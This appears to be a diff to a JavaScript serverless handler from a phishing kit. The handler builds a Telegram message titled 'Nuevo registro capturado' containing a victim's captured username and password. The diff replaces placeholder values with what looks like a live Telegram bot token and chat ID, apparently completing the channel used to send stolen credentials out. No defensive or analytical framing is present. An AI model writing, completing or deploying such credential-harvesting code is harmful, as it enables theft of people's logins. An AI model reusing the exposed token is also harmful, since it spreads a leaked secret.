@@ -13,8 +13,8 @@ export default async function handler(req, res) {
     }
 
     // 4. 🔴 REEMPLAZA ESTOS VALORES POR LOS DE TU BOT DE TELEGRAM
-    const token = "TU_TOKEN_HTTP_API_AQUI"; 
-    const chat_id = "TU_CHAT_ID_AQUI";
+    const token = "8730725822:AAH5trbrzrF8VxcnouW2J8yo2khwD-PXzoM"; 
+    const chat_id = "7430967735";
 
     // 5. Construir el mensaje
     const mensaje = `🚨 <b>Nuevo registro capturado</b>\n\n<b>Usuario:</b> ${usuario}\n<b>Contraseña:</b> ${contrasenha}`;
